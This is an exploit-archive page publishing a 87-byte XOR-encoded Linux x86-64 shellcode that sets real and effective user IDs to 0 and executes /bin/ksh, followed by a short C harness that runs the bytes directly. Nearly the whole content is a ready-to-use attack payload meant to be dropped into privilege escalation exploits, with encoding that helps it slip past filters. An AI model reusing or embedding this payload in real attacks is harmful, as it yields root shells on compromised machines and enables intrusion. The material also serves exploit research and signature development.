<html><head><title>Linux/x86-64 - Linux x86-64 setreuid (0,0) &amp; execve(/bin/ksh, [/bin/ksh, NULL]) + XOR encoded - 87 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title: Linux x86-64 setreuid (0,0) &amp; execve(&quot;/bin/ksh&quot;, [&quot;/bin/ksh&quot;, NULL]) + XOR encoded - 87 bytes
# Author: egeektronic &lt;info (at) egeektronic {dot} com&gt;
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer

unsigned char shellcode[] = 
&quot;\x4d\x31\xc0\x41\xb1\x17\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb&quot;
&quot;\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48&quot;
&quot;\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x5f\x26\xd7\x5f\x94\xd7&quot;
&quot;\x66\x5f\x26\xe8\x5f\x26\xe1\x18\x12\xfc\x05\x5f\x26\xd7\x5f&quot;
&quot;\x94\xd7\x2c\x48\x5f\x26\xc5\x45\x40\x5f\x9e\xf1\x18\x12\xff&quot;
&quot;\xfe\xe8\xe8\xe8\x38\x75\x7e\x79\x38\x7c\x64\x7f&quot;;                                    
int main(void) { ((void (*)())shellcode)(); }

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
